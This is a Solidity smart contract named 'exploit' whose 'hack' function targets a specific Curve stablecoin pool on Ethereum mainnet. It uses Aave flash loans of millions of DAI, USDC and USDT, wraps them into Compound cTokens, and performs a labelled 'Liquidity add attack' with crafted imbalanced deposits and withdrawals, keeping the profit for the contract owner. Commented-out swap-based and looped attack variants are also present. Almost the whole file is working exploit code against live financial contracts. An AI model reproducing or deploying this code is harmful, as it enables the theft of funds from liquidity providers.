//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";

interface CurvePool {
	function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
	function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
	function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
	function remove_liquidity(uint256 _amount, uint256[3] calldata min_amounts) external;
	function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external;
	function balances(int128) external view returns (uint256);
	function get_virtual_price() external returns (uint256);
}

interface FlashLendingPool {
	function flashLoan(address receiverAddress, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
	function getReserveData(address _reserve) external view returns (
            uint256 totalLiquidity,
            uint256 availableLiquidity,
            uint256 totalBorrowsStable,
            uint256 totalBorrowsVariable,
            uint256 liquidityRate,
            uint256 variableBorrowRate,
            uint256 stableBorrowRate,
            uint256 averageStableBorrowRate,
            uint256 utilizationRate,
            uint256 liquidityIndex,
            uint256 variableBorrowIndex,
            address aTokenAddress,
            uint40 lastUpdateTimestamp
	);
}

interface UniSwap {
	function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
	function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
	function WETH() external pure returns (address);
}

interface CErc20 is IERC20{
	function mint(uint mintAmount) external returns (uint);
	function redeemUnderlying(uint redeemAmount) external returns (uint);
	function redeem(uint redeemTokens) external returns (uint);
	
	function exchangeRateStored() external view returns (uint);
	function supplyRatePerBlock() external view returns (uint);
	function accrualBlockNumber() external view returns (uint);
	function exchangeRateCurrent() external returns (uint);
}

contract exploit is Ownable {
	
	address curve = 0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C;
	address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;//0
	address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;//1
	address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;//2
	address curve_pool_token = 0x9fC689CCaDa600B6DF723D9E47D84d76664a1F23;
	address LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//aave lending pool
	address uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
	
	address cusdt = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
	address cdai = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
	address cusdc = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
	
	constructor () {
		
		
	}

	event Info(
		string info,
		uint256 b1,
		uint256 b2,
		uint256 b3
	);

	function hack() public onlyOwner payable {
		uint256 size;
		
		assembly {
			size := extcodesize(0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C)
		}
		require(size > 0, 'Curve contract not found');
		//CurvePool(0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C).get_virtual_price();
		
		uint256[3] memory bal;
		bal[0] = CurvePool(curve).balances(0);
		bal[1] = CurvePool(curve).balances(1);
		bal[2] = CurvePool(curve).balances(2);
		
		emit Info('current_ctokens',bal[0],bal[1],bal[2]);
		emit Info('token_suply',IERC20(curve_pool_token).totalSupply(),0,0);
		
        address[] memory assets = new address[](3);
        assets[0] = dai;
        assets[1] = usdc;
        assets[2] = usdt;

        // 0 = no debt, 1 = stable, 2 = variable
        uint256[] memory modes = new uint256[](3);
		modes[0] = 0;
		modes[1] = 0;
		modes[2] = 0;
		
		uint256[] memory loanAmounts = new uint256[](3);
        loanAmounts[0] = 15000000 ether; //targets[1] - bal[1];
        loanAmounts[1] = 15000000*10**6;//15000000*10**6; //targets[0] - bal[0];
        loanAmounts[2] = 6000000*10**6;//15000000*10**6; //targets[2] - bal[2];
		
		//uint256 totalLiquidity,  availableLiquidity, totalBorrowsStable, totalBorrowsVariable, liquidityRate, variableBorrowRate, stableBorrowRate,  averageStableBorrowRate, utilizationRate, liquidityIndex, variableBorrowIndex, aTokenAddress,lastUpdateTimestamp = FlashLendingPool(LENDING_POOL).getReserveData(assets[0])
		//(loanAmounts[0],,,,,,,,,,,,) = FlashLendingPool(LENDING_POOL).getReserveData(assets[0]);
		//(loanAmounts[1],,,,,,,,,,,,) = FlashLendingPool(LENDING_POOL).getReserveData(assets[1]);
		//(loanAmounts[2],,,,,,,,,,,,) = FlashLendingPool(LENDING_POOL).getReserveData(assets[2]);
	
		//require(targets[0] >= bal[0], 'Loan amount 0 too low');
		//require(targets[1] >= bal[1], 'Loan amount 1 too low');
		//require(targets[2] >= bal[2], 'Loan amount 2 too low');
		emit Info("LoanAmounts", loanAmounts[0], loanAmounts[1], loanAmounts[2]);
        uint16 referralCode = 0;
		bytes memory params = "";//abi.encode(swap_from, swap_to, amount);
		
        FlashLendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            loanAmounts,
            modes,
            address(this),
            params,
            referralCode
        );
	}
	
	function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params) external payable returns (bool) {
			
		{
			address[] memory path = new address[](2);
			path[0] = UniSwap(uniswap).WETH();
			path[1] = dai;
			//UniSwap(uniswap).swapETHForExactTokens{value: 0.080 ether}(45*10**18, path, address(this), block.timestamp );
			UniSwap(uniswap).swapExactETHForTokens{value: 100.02543 ether}(45, path, address(this), block.timestamp );
			path[1] = usdc;
			//UniSwap(uniswap).swapETHForExactTokens{value: 0.080 ether}(45*10**6, path, address(this), block.timestamp );
			UniSwap(uniswap).swapExactETHForTokens{value: 100.02543 ether}(45, path, address(this), block.timestamp );
			path[1] = usdt;
			//UniSwap(uniswap).swapETHForExactTokens{value: 0.080 ether}(45*10**6, path, address(this), block.timestamp );
			UniSwap(uniswap).swapExactETHForTokens{value: 9700.02543 ether}(45, path, address(this), block.timestamp );
		}

		uint256[3] memory ourBals; 
		ourBals[0] = IERC20(dai).balanceOf(address(this));
		ourBals[1] = IERC20(usdc).balanceOf(address(this));
		ourBals[2] = IERC20(usdt).balanceOf(address(this));
		emit Info("funds_avail_toks", IERC20(dai).balanceOf(address(this)), IERC20(usdc).balanceOf(address(this)), IERC20(usdt).balanceOf(address(this)));
			
			
		{
			IERC20(dai).approve(cdai, ourBals[0]);
			require(CErc20(cdai).mint(ourBals[0]) == 0,'cdai failed');
			
			IERC20(usdc).approve(cusdc, ourBals[1]);
			require(CErc20(cusdc).mint(ourBals[1]) == 0,'cusdc failed');
		}
		

		//deposit funds to curve
		{
			uint256[3] memory deposit;
			deposit[0] = CErc20(cdai).balanceOf(address(this));
			deposit[1] = CErc20(cusdc).balanceOf(address(this));
			deposit[2] = IERC20(usdt).balanceOf(address(this));
			emit Info("funds_avail_ctokens", deposit[0], deposit[1], deposit[2]);
			
			{
				uint256[3] memory rates =_stored_rates();
				emit Info("rates",rates[0],rates[1],rates[2]);
				emit Info("vPrice",CurvePool(curve).get_virtual_price(),0,0);
			}
							
			{
				IERC20(cdai).approve(curve, uint(-1));
				IERC20(cusdc).approve(curve, uint(-1));
				SafeERC20.safeApprove(IERC20(usdt), curve, uint(-1));
			}
/*
			//perform the attack SWAP ATTACK
			{
				int128 i = 1;
				int128 j = 0;
				emit Info('tokensNow',deposit[0],deposit[1],deposit[2]);
				deposit[0] = CErc20(cdai).balanceOf(address(this));
				{
					uint256 amount = 2776297808957086; //cUnits in i
					CurvePool(curve).exchange(i, j, amount, 0);
				}
				{
					deposit[1] = CErc20(cusdc).balanceOf(address(this));
					deposit[2] = IERC20(usdt).balanceOf(address(this));
					emit Info('tokensMiddle',CErc20(cdai).balanceOf(address(this)),deposit[1],deposit[2]);
				}
				{
					uint256 amountBack = CErc20(cdai).balanceOf(address(this))-deposit[0]; //cUnits in j;
					emit Info('amountBack1',amountBack,0,0);
					CurvePool(curve).exchange(j, i, amountBack, 0);
					
					amountBack = CErc20(cusdc).balanceOf(address(this))-deposit[1]; //cUnits in j;
					emit Info('amountBack2',amountBack,0,0);
				}
				
				deposit[0] = CErc20(cdai).balanceOf(address(this));
				deposit[1] = CErc20(cusdc).balanceOf(address(this));
				deposit[2] = IERC20(usdt).balanceOf(address(this));
				emit Info('tokensAfter',deposit[0],deposit[1],deposit[2]);
			}*/
			
			//Liquidity add attack
			
			{
				emit Info('tokensBefore',CErc20(cdai).balanceOf(address(this)),CErc20(cusdc).balanceOf(address(this)),IERC20(usdt).balanceOf(address(this)));
				emit Info('tokensBefore_pool',CErc20(curve_pool_token).balanceOf(address(this)),0,0);
				
				uint256[3] memory attackAdd; 
				attackAdd[0] = 53425824383530;
				attackAdd[1] = 5322288624601;
				attackAdd[2] = 12817234502;
				emit Info('addLiquidity1',attackAdd[0],attackAdd[1],attackAdd[2]);
				CurvePool(curve).add_liquidity(attackAdd, 0);
				emit Info("vPrice2",CurvePool(curve).get_virtual_price(),0,0);
				emit Info('liqBal',CurvePool(curve).balances(0),CurvePool(curve).balances(1),CurvePool(curve).balances(2));
				emit Info('tokensAfter1',CErc20(cdai).balanceOf(address(this)),CErc20(cusdc).balanceOf(address(this)),IERC20(usdt).balanceOf(address(this)));
				emit Info('tokensAfter1_pool',IERC20(curve_pool_token).balanceOf(address(this)),0,0);
				emit Info('after:token_suply',IERC20(curve_pool_token).totalSupply(),0,0);
				
				//emit Info('addLiquidity2',attackAdd[0],attackAdd[1],attackAdd[2]);
				//attackAdd[0] = 152489278429121;
				//attackAdd[1] = 1542791177214;
				//attackAdd[2] = 33327388298;
				//CurvePool(curve).add_liquidity(attackAdd, 0);
				//emit Info('tokensAfter2',CErc20(cdai).balanceOf(address(this)),CErc20(cusdc).balanceOf(address(this)),IERC20(usdt).balanceOf(address(this)));
				//emit Info('tokensAfter2_pool',CErc20(curve_pool_token).balanceOf(address(this)),0,0);
				
				
				uint256 poolTokens = CErc20(curve_pool_token).balanceOf(address(this));
				uint256[3] memory min_amounts; 
				CurvePool(curve).remove_liquidity(poolTokens, min_amounts);
				emit Info('tokensInTheEd',CErc20(cdai).balanceOf(address(this)),CErc20(cusdc).balanceOf(address(this)),IERC20(usdt).balanceOf(address(this)));
			}
			/*
			//Liquidity add attack looped
			{
				emit Info('tokensBefore',CErc20(cdai).balanceOf(address(this)),CErc20(cusdc).balanceOf(address(this)),IERC20(usdt).balanceOf(address(this)));
				emit Info('tokensBefore_pool',CErc20(curve_pool_token).balanceOf(address(this)),0,0);

				uint256[3] memory targetBal;
				targetBal[0] = CurvePool(curve).balances(0)+53425824383530;
				targetBal[1] = CurvePool(curve).balances(1)+5322288624601;
				targetBal[2] = CurvePool(curve).balances(2)+12817234502;
				uint256[3] memory attackAdd;
				uint256[3] memory min_amounts;
				uint256 poolTokens;
				//for (uint i=0; i<2; i++) {
					attackAdd[0] = targetBal[0]-CurvePool(curve).balances(0);
					attackAdd[1] = targetBal[1]-CurvePool(curve).balances(1);
					attackAdd[2] = targetBal[2]-CurvePool(curve).balances(2);
					CurvePool(curve).add_liquidity(attackAdd, 0);
					
					attackAdd[0] = 152489278429121;
					attackAdd[1] = 5542791177214;
					attackAdd[2] = 33327388298;
					CurvePool(curve).add_liquidity(attackAdd, 0);
					poolTokens = IERC20(curve_pool_token).balanceOf(address(this));
					CurvePool(curve).remove_liquidity(poolTokens, min_amounts);
				//}
				CurvePool(curve).exchange(1, 0, CurvePool(curve).balances(0)-targetBal[0], 0);
				CurvePool(curve).exchange(2, 0, CurvePool(curve).balances(2)-targetBal[2], 0);
				attackAdd[0] = targetBal[0]-CurvePool(curve).balances(0);
				attackAdd[1] = targetBal[1]-CurvePool(curve).balances(1);
				attackAdd[2] = targetBal[2]-CurvePool(curve).balances(2);
				emit Info('targetBal',targetBal[0],targetBal[1],targetBal[2]);
				emit Info('curveBalances',CurvePool(curve).balances(0),CurvePool(curve).balances(1),CurvePool(curve).balances(2));
				emit Info('attackAdd',attackAdd[0],attackAdd[1],attackAdd[2]);
				
				poolTokens = IERC20(curve_pool_token).balanceOf(address(this));
				CurvePool(curve).remove_liquidity(poolTokens, min_amounts);
				
				//poolTokens = CErc20(curve_pool_token).balanceOf(address(this));
				//CurvePool(curve).remove_liquidity(poolTokens, min_amounts);
				emit Info('tokensInTheEd',CErc20(cdai).balanceOf(address(this)),CErc20(cusdc).balanceOf(address(this)),IERC20(usdt).balanceOf(address(this)));
			}*/
		}
		require(CErc20(cdai).redeem(CErc20(cdai).balanceOf(address(this))) == 0, 'cdai redeem failed');
		require(CErc20(cusdc).redeem(CErc20(cusdc).balanceOf(address(this))) == 0, 'usdc redeem failed');
		emit Info("funds_avail_toks_end", IERC20(dai).balanceOf(address(this)), IERC20(usdc).balanceOf(address(this)), IERC20(usdt).balanceOf(address(this)));
		
        // Approve the LendingPool contract allowance to *pull* the owed amount
		IERC20(assets[0]).approve(LENDING_POOL, amounts[0] + premiums[0]);
		IERC20(assets[1]).approve(LENDING_POOL, amounts[1] + premiums[1]);
		SafeERC20.safeApprove(IERC20(assets[2]), LENDING_POOL, amounts[2] + premiums[2]);
        
        return true;
    }
	
	function _stored_rates() public returns (uint256[3] memory) {
		//exchangeRateStored * (1 + supplyRatePerBlock * (getBlockNumber - accrualBlockNumber) / 1e18)
		
		uint256[3] memory result;
		result[0] = 1;//cdai
		result[1] = 1000000000000;//usdc
		result[2] = 1000000000000*10**18;//usdt
		
		uint256 rate = CErc20(cdai).exchangeRateCurrent();
		//uint256 supply_rate = CErc20(cdai).supplyRatePerBlock();
		//uint256 old_block = CErc20(cdai).accrualBlockNumber();
		//rate += rate * supply_rate * (block.number - old_block) / 10**18;
		result[0]*=rate;
		
		rate = CErc20(cusdc).exchangeRateCurrent();
		//supply_rate = CErc20(cusdc).supplyRatePerBlock();
		//old_block = CErc20(cusdc).accrualBlockNumber();
		//rate += rate * supply_rate * (block.number - old_block) / 10**18;
		result[1]*=rate;
		return result;
	}
	
	function getTokens(address addr, uint256 amount) public onlyOwner {
		IERC20(addr).transfer(msg.sender, amount);
	}

}